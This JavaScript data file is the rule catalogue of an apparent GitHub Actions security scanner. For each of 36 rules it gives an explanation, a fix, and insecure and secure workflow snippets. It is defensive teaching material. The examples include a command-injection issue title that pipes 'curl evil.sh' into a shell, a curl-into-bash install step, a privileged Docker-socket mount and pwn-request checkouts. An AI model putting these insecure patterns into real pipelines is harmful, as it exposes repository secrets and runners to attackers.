// PipelineGuard rule catalogue.
// Each rule: id, slug, title, severity, summary (what & why), fix (how), example (bad → good).
// The detection logic lives in scan.mjs; this file is pure data so the rules page,
// the CLI and the browser all describe findings the same way.

export const SEVERITIES = ["critical", "high", "medium", "low", "info"];

export const SEVERITY_META = {
  critical: { label: "Critical", weight: 35, marking: "Fire red" },
  high: { label: "High", weight: 20, marking: "Hazard orange" },
  medium: { label: "Medium", weight: 8, marking: "Caution yellow" },
  low: { label: "Low", weight: 3, marking: "Notice blue" },
  info: { label: "Info", weight: 1, marking: "Safe green" },
};

export const RULES = [
  {
    id: "PG001",
    slug: "pwn-request-checkout",
    title: "Untrusted pull request code runs with a privileged token",
    severity: "critical",
    summary:
      "The workflow is triggered by pull_request_target or workflow_run, which run with write access and secrets, and then checks out the pull request's own code. Anything in that fork (a build script, a package.json hook, a Makefile) now runs with your token. This is the classic \"pwn request\".",
    fix:
      "Use the plain pull_request trigger for anything that builds or tests contributor code. If you need a privileged follow-up (labelling, commenting), split it into a second workflow that never checks out the PR head.",
    bad: `on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test`,
    good: `on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test`,
  },
  {
    id: "PG002",
    slug: "script-injection",
    title: "Attacker-controlled text is pasted straight into a shell script",
    severity: "high",
    summary:
      "An expression like ${{ github.event.issue.title }} is expanded into the script before the shell sees it. A title such as a\"; curl evil.sh | sh; # becomes code. Issue titles, PR bodies, branch names, commit messages and comments are all attacker-controlled.",
    fix:
      "Pass the value through an environment variable and reference it as a quoted shell variable. The shell then treats it as data, never as code.",
    bad: `- run: echo "New issue: \${{ github.event.issue.title }}"`,
    good: `- env:
    TITLE: \${{ github.event.issue.title }}
  run: echo "New issue: $TITLE"`,
  },
  {
    id: "PG003",
    slug: "unpinned-action",
    title: "Action is referenced by a movable tag or branch",
    severity: "medium",
    summary:
      "Tags like @v3 and branches like @main can be moved to new code at any time. If the action's repository is compromised (as happened with tj-actions/changed-files in 2025), every workflow using the tag runs the attacker's version on its next run.",
    fix:
      "Pin to a full 40-character commit SHA and keep the version in a comment so Dependabot or Renovate can still update it.",
    bad: `- uses: some-org/deploy-action@v2`,
    good: `- uses: some-org/deploy-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v2.1.0`,
  },
  {
    id: "PG004",
    slug: "broad-token-permissions",
    title: "GITHUB_TOKEN permissions are not restricted",
    severity: "medium",
    summary:
      "Without a permissions block, the token inherits the repository default, which on many older repos and orgs is read/write to everything. write-all is worse. Any compromised step can then push code, publish releases or edit issues.",
    fix:
      "Set permissions: contents: read at the top of the workflow and grant extra scopes per job, only where needed.",
    bad: `name: build
on: push
jobs:
  build:
    runs-on: ubuntu-latest`,
    good: `name: build
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest`,
  },
  {
    id: "PG005",
    slug: "secret-in-script",
    title: "Secret is interpolated directly into a run script",
    severity: "medium",
    summary:
      "${{ secrets.X }} inside run: writes the secret's value into the generated script file on the runner. It also breaks if the secret contains quotes, and echoing it can defeat log masking when the value is transformed.",
    fix:
      "Expose the secret through env: and reference it as a variable. Never echo, print or base64 a secret.",
    bad: `- run: echo "\${{ secrets.DEPLOY_TOKEN }}" | docker login -u me --password-stdin`,
    good: `- env:
    DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
  run: printf '%s' "$DEPLOY_TOKEN" | docker login -u me --password-stdin`,
  },
  {
    id: "PG006",
    slug: "hardcoded-credential",
    title: "Credential is committed in the workflow file",
    severity: "critical",
    summary:
      "The file contains something that looks like a real AWS key, GitHub token, Slack token, OpenAI/Anthropic key or private key. Anyone who can read the repository, and its git history, can use it.",
    fix:
      "Revoke the credential now, then move it to repository or environment secrets. For cloud access, prefer OIDC (aws-actions/configure-aws-credentials with role-to-assume) so there is no long-lived key at all.",
    bad: `env:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE`,
    good: `permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
      aws-region: me-central-1`,
  },
  {
    id: "PG007",
    slug: "curl-pipe-shell",
    title: "Remote script is piped straight into a shell",
    severity: "medium",
    summary:
      "curl … | bash runs whatever the server returns at that moment, unverified. If the host or the DNS is hijacked, your runner (and its token) belongs to someone else.",
    fix:
      "Download to a file, verify a pinned checksum or signature, then execute. Better still, use a pinned action or package manager.",
    bad: `- run: curl -sL https://get.example.sh | bash`,
    good: `- run: |
    curl -sLo install.sh https://get.example.sh
    echo "3b1c…e9  install.sh" | sha256sum -c -
    bash install.sh`,
  },
  {
    id: "PG008",
    slug: "unsecure-commands",
    title: "Deprecated set-env / add-path commands are re-enabled",
    severity: "high",
    summary:
      "ACTIONS_ALLOW_UNSECURE_COMMANDS turns back on the ::set-env:: and ::add-path:: log commands GitHub disabled in 2020. Any step that prints attacker text to the log can then inject environment variables such as LD_PRELOAD or NODE_OPTIONS.",
    fix:
      "Remove the variable and write to the $GITHUB_ENV and $GITHUB_PATH files instead.",
    bad: `env:
  ACTIONS_ALLOW_UNSECURE_COMMANDS: true`,
    good: `- run: echo "TOOL_HOME=/opt/tool" >> "$GITHUB_ENV"`,
  },
  {
    id: "PG009",
    slug: "self-hosted-on-pr",
    title: "Self-hosted runner accepts pull request jobs",
    severity: "high",
    summary:
      "A pull request from a fork can run arbitrary code on a self-hosted runner. Unlike GitHub-hosted runners, it is not thrown away after the job, so an attacker can persist, read other jobs' secrets or reach your internal network.",
    fix:
      "Run untrusted PR jobs on GitHub-hosted runners. If you must use self-hosted, use ephemeral runners (for example actions-runner-controller with ephemeral pods) and require approval for fork PRs.",
    bad: `on: pull_request
jobs:
  test:
    runs-on: [self-hosted, linux]`,
    good: `on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest`,
  },
  {
    id: "PG010",
    slug: "checkout-persists-credentials",
    title: "actions/checkout leaves the token in .git/config",
    severity: "low",
    summary:
      "By default actions/checkout writes the GITHUB_TOKEN into the local git config so later steps can push. Every later step, including third-party actions and uploaded artifacts of the workspace, can read it.",
    fix:
      "Set persist-credentials: false unless a later step really needs to push.",
    bad: `- uses: actions/checkout@v4`,
    good: `- uses: actions/checkout@v4
  with:
    persist-credentials: false`,
  },
  {
    id: "PG011",
    slug: "unpinned-container-image",
    title: "Container image is not pinned to a digest",
    severity: "low",
    summary:
      "Images referenced by tag (or with no tag, which means latest) can be replaced in the registry. The job silently runs whatever was pushed last.",
    fix: "Reference the image by digest: image@sha256:…, and keep the tag in a comment.",
    bad: `container:
  image: node:latest`,
    good: `container:
  image: node@sha256:2b1c6f2a…  # node:22.11-bookworm`,
  },
  {
    id: "PG012",
    slug: "artifact-poisoning",
    title: "Privileged workflow trusts artifacts from an untrusted run",
    severity: "high",
    summary:
      "A workflow_run job downloads artifacts produced by a pull request build. The fork controls those artifacts, so extracting them over your workspace, sourcing them or writing them to $GITHUB_ENV hands the fork code execution with your secrets.",
    fix:
      "Download artifacts into a dedicated directory, treat every byte as untrusted data, validate it (for example, parse a number with a strict regex) and never execute or source it.",
    bad: `on:
  workflow_run:
    workflows: [ci]
    types: [completed]
jobs:
  report:
    steps:
      - uses: actions/download-artifact@v4
      - run: cat pr.env >> "$GITHUB_ENV"`,
    good: `- uses: actions/download-artifact@v4
  with:
    path: \${{ runner.temp }}/untrusted
- run: |
    PR=$(cat "$RUNNER_TEMP/untrusted/pr-number")
    [[ "$PR" =~ ^[0-9]+$ ]] || exit 1`,
  },
  {
    id: "PG013",
    slug: "missing-timeout",
    title: "Job has no timeout",
    severity: "info",
    summary:
      "Jobs default to a 6-hour timeout. A hung step burns runner minutes (or a self-hosted machine) for hours before anyone notices.",
    fix: "Set timeout-minutes on every job to a sensible ceiling, such as 2–3× its normal duration.",
    bad: `jobs:
  build:
    runs-on: ubuntu-latest`,
    good: `jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15`,
  },
  {
    id: "PG014",
    slug: "secrets-inherit",
    title: "Reusable workflow receives every secret",
    severity: "low",
    summary:
      "secrets: inherit forwards all repository, org and environment secrets to the called workflow, not just the ones it needs. If that workflow or one of its actions is compromised, everything leaks.",
    fix: "Pass only the secrets the called workflow declares.",
    bad: `jobs:
  deploy:
    uses: org/platform/.github/workflows/deploy.yml@<sha>
    secrets: inherit`,
    good: `jobs:
  deploy:
    uses: org/platform/.github/workflows/deploy.yml@<sha>
    secrets:
      KUBE_CONFIG: \${{ secrets.KUBE_CONFIG }}`,
  },
  {
    id: "PG015",
    slug: "unguarded-comment-trigger",
    title: "Anyone can trigger this job by commenting",
    severity: "medium",
    summary:
      "issue_comment and discussion_comment workflows run for every commenter, including people with no access to the repository. ChatOps commands such as /deploy or /release must check who is asking.",
    fix:
      "Gate the job on the commenter's association with the repository.",
    bad: `on: issue_comment
jobs:
  deploy:
    if: contains(github.event.comment.body, '/deploy')`,
    good: `on: issue_comment
jobs:
  deploy:
    if: >-
      contains(github.event.comment.body, '/deploy') &&
      contains(fromJSON('["OWNER","MEMBER"]'), github.event.comment.author_association)`,
  },
  {
    id: "PG016",
    slug: "privileged-trigger",
    title: "Privileged trigger without explicit permissions",
    severity: "medium",
    summary:
      "pull_request_target and workflow_run always run with secrets and, unless restricted, a write token, even when the event came from a fork. Even without checking out fork code today, the next edit to this file could.",
    fix: "Declare the smallest permissions block that works, and add a comment explaining why the privileged trigger is needed.",
    bad: `on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest`,
    good: `on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest`,
  },

  { id: "PG017", slug: "dispatch-input-injection", title: "Manual workflow input is pasted into a shell script", severity: "medium",
    summary: "${{ inputs.x }} and ${{ github.event.inputs.x }} are expanded into the script before the shell runs. Anyone with write access, or a stolen token, can turn an input field into a command.",
    fix: "Pass inputs through env: and quote the variable. Use type: choice for inputs that only have a few valid values.",
    bad: `- run: ./deploy.sh \${{ inputs.environment }}`, good: `- env:\n    TARGET: \${{ inputs.environment }}\n  run: ./deploy.sh "$TARGET"` },
  { id: "PG018", slug: "step-output-injection", title: "Step or job output is pasted into a shell script", severity: "low",
    summary: "Outputs often carry text that came from somewhere else: a branch name, a file, an API response. Expanding ${{ steps.x.outputs.y }} straight into run: makes that text code.",
    fix: "Map the output to an env: variable and quote it in the script.",
    bad: `- run: echo "\${{ steps.meta.outputs.title }}"`, good: `- env:\n    TITLE: \${{ steps.meta.outputs.title }}\n  run: echo "$TITLE"` },
  { id: "PG019", slug: "always-true-if", title: "if: condition is always true", severity: "high",
    summary: "When an if: mixes ${{ }} with text outside the braces, GitHub evaluates the whole thing as a non-empty string, which is truthy. Your guard, often a security check, never blocks anything.",
    fix: "Write the condition without ${{ }}, or put the entire expression inside one pair of braces.",
    bad: `if: \${{ github.actor }} == 'dependabot[bot]'`, good: `if: github.actor == 'dependabot[bot]'` },
  { id: "PG020", slug: "literal-credential-input", title: "Password or token is passed as plain text to an action", severity: "high",
    summary: "An input named password, token, secret or api-key has a literal value instead of a secrets reference. It's readable by anyone who can read the repo and it lives forever in git history.",
    fix: "Store the value as a repository or environment secret and reference it with ${{ secrets.NAME }}.",
    bad: `with:\n  password: hunter2`, good: `with:\n  password: \${{ secrets.REGISTRY_PASSWORD }}` },
  { id: "PG021", slug: "github-token-in-script", title: "GITHUB_TOKEN is written into a run script", severity: "medium",
    summary: "${{ github.token }} or ${{ secrets.GITHUB_TOKEN }} inside run: lands in the generated script on disk and is easy to leak through echo, set -x or a curl -v.",
    fix: "Pass it as GH_TOKEN through env: and let the gh CLI or your tool read it from the environment.",
    bad: `- run: gh pr comment 1 --body hi -R x/y --token \${{ github.token }}`, good: `- env:\n    GH_TOKEN: \${{ github.token }}\n  run: gh pr comment 1 --body hi` },
  { id: "PG022", slug: "tls-verification-disabled", title: "TLS certificate checks are turned off", severity: "medium",
    summary: "curl -k, wget --no-check-certificate, NODE_TLS_REJECT_UNAUTHORIZED=0, GIT_SSL_NO_VERIFY or StrictHostKeyChecking=no let anyone on the network path swap what you download or where you push.",
    fix: "Fix the certificate chain or pin the host key (ssh-keyscan into known_hosts) instead of disabling verification.",
    bad: `- run: curl -k https://artifacts.internal/tool.tgz -o tool.tgz`, good: `- run: curl --cacert ca.pem https://artifacts.internal/tool.tgz -o tool.tgz` },
  { id: "PG023", slug: "trace-with-secrets", title: "Shell tracing is on in a step that has secrets", severity: "medium",
    summary: "set -x prints every command after expansion. Masking only catches exact secret values, so anything derived from a secret (base64, URL-encoded, part of a header) is printed in clear text.",
    fix: "Remove set -x from steps that receive secrets, or turn it off around the commands that use them.",
    bad: `- env:\n    TOKEN: \${{ secrets.API_TOKEN }}\n  run: |\n    set -x\n    curl -H "Authorization: Bearer $TOKEN" ...`, good: `- env:\n    TOKEN: \${{ secrets.API_TOKEN }}\n  run: |\n    curl -sf -H "Authorization: Bearer $TOKEN" ...` },
  { id: "PG024", slug: "artifact-uploads-workspace", title: "Whole workspace is uploaded as an artifact", severity: "medium",
    summary: "Uploading . or ** includes .git/config, which holds the checkout token unless persist-credentials is false. Artifacts on public repos can be downloaded by anyone.",
    fix: "Upload only the build output directory, and set persist-credentials: false on checkout.",
    bad: `- uses: actions/upload-artifact@v4\n  with:\n    path: .`, good: `- uses: actions/upload-artifact@v4\n  with:\n    path: dist/` },
  { id: "PG025", slug: "cache-in-privileged-workflow", title: "Cache is used in a privileged workflow", severity: "medium",
    summary: "pull_request_target and workflow_run run on the base branch, so the cache they write is shared with your main branch. Code from a fork that can write the cache can poison what your release jobs restore later.",
    fix: "Don't restore or save caches in privileged workflows. Keep caching in unprivileged pull_request and push jobs.",
    bad: `on: pull_request_target\n...\n  - uses: actions/cache@v4`, good: `on: pull_request\n...\n  - uses: actions/cache@v4` },
  { id: "PG026", slug: "deprecated-workflow-command", title: "Uses the removed set-output / save-state commands", severity: "low",
    summary: "::set-output and ::save-state were deprecated because log output could inject values. Runners now warn and will fail on them.",
    fix: "Write to $GITHUB_OUTPUT and $GITHUB_STATE instead.",
    bad: `- run: echo "::set-output name=tag::v1"`, good: `- run: echo "tag=v1" >> "$GITHUB_OUTPUT"` },
  { id: "PG027", slug: "archived-action", title: "Action is archived and no longer maintained", severity: "low",
    summary: "Archived actions such as actions/create-release, actions/upload-release-asset and actions/setup-ruby get no security fixes and often run on retired Node versions.",
    fix: "Switch to the maintained replacement, for example softprops/action-gh-release or the gh CLI for releases and ruby/setup-ruby for Ruby.",
    bad: `- uses: actions/create-release@v1`, good: `- env:\n    GH_TOKEN: \${{ github.token }}\n  run: gh release create "$GITHUB_REF_NAME" dist/*` },
  { id: "PG028", slug: "retired-runner-image", title: "Job targets a retired runner image", severity: "low",
    summary: "Images such as ubuntu-18.04, ubuntu-20.04, windows-2019 and macos-12 have been removed. Jobs queue forever or fail, and old images miss security patches.",
    fix: "Move to a current image such as ubuntu-24.04, or ubuntu-latest if you accept automatic upgrades.",
    bad: `runs-on: ubuntu-20.04`, good: `runs-on: ubuntu-24.04` },
  { id: "PG029", slug: "previously-compromised-action", title: "Action had a publicly reported compromise", severity: "medium",
    summary: "tj-actions/changed-files and reviewdog actions had their tags rewritten to steal CI secrets in 2025. Tag references to them are only as safe as their current maintainers' accounts.",
    fix: "Pin to a SHA you have reviewed, or replace the action with a few lines of git and shell.",
    bad: `- uses: tj-actions/changed-files@v45`, good: `- run: git diff --name-only "$BASE_SHA" HEAD` },
  { id: "PG030", slug: "typosquatted-action", title: "Action name looks like a typo of a popular action", severity: "high",
    summary: "Names such as actons/checkout or action/checkout belong to someone else. Typosquatted actions are a known way to slip malicious code into pipelines.",
    fix: "Correct the owner and name, then pin to a SHA.",
    bad: `- uses: actons/checkout@v4`, good: `- uses: actions/checkout@<sha> # v4` },
  { id: "PG031", slug: "privileged-container", title: "Container runs with --privileged or the Docker socket", severity: "medium",
    summary: "--privileged, or mounting /var/run/docker.sock, gives the container root on the runner host. On self-hosted runners that host persists between jobs.",
    fix: "Drop --privileged and add only the specific capabilities you need. Use rootless BuildKit or Kaniko for image builds.",
    bad: `- run: docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock tool`, good: `- run: docker run --rm --cap-add NET_ADMIN tool` },
  { id: "PG032", slug: "unlocked-dependency-install", title: "Dependencies are installed without the lockfile", severity: "low",
    summary: "npm install and yarn install without --frozen-lockfile can resolve newer versions than the ones you reviewed. A compromised release published minutes ago lands in your build.",
    fix: "Use npm ci, yarn install --frozen-lockfile (or --immutable), pnpm install --frozen-lockfile, or pip install --require-hashes.",
    bad: `- run: npm install`, good: `- run: npm ci` },
  { id: "PG033", slug: "broad-oidc-permission", title: "OIDC id-token: write is granted to the whole workflow", severity: "low",
    summary: "id-token: write lets a job mint cloud credentials. Granted at the top level, every job and every action in it can request a token for your AWS, GCP or Azure roles.",
    fix: "Grant id-token: write only on the deploy job that assumes the role.",
    bad: `permissions:\n  id-token: write\n  contents: read`, good: `jobs:\n  deploy:\n    permissions:\n      id-token: write\n      contents: read` },
  { id: "PG034", slug: "deploy-without-concurrency", title: "Deploy workflow can run twice at the same time", severity: "info",
    summary: "Two pushes in quick succession start two deploys that race each other. The older commit can finish last and quietly roll production back.",
    fix: "Add a concurrency group so deploys queue instead of overlapping.",
    bad: `name: deploy\non:\n  push:\n    branches: [main]`, good: `name: deploy\non:\n  push:\n    branches: [main]\nconcurrency:\n  group: deploy-production\n  cancel-in-progress: false` },
  { id: "PG035", slug: "workflow-run-any-branch", title: "workflow_run trigger has no branch filter", severity: "low",
    summary: "Without branches:, the privileged workflow_run job also fires for runs on fork pull request branches, which widens what untrusted code can influence.",
    fix: "Add branches: [main] (or your release branches) under the workflow_run trigger.",
    bad: `on:\n  workflow_run:\n    workflows: [ci]\n    types: [completed]`, good: `on:\n  workflow_run:\n    workflows: [ci]\n    types: [completed]\n    branches: [main]` },
  { id: "PG036", slug: "unchecked-failure", title: "Security or test step is allowed to fail silently", severity: "low",
    summary: "continue-on-error: true on a scan, audit, lint or test step means the build stays green even when the check finds a problem, so nobody looks.",
    fix: "Remove continue-on-error, or keep it and fail a later step if the check reported issues.",
    bad: `- run: npm audit --audit-level=high\n  continue-on-error: true`, good: `- run: npm audit --audit-level=high` },
];

export const RULE_BY_ID = Object.fromEntries(RULES.map((r) => [r.id, r]));
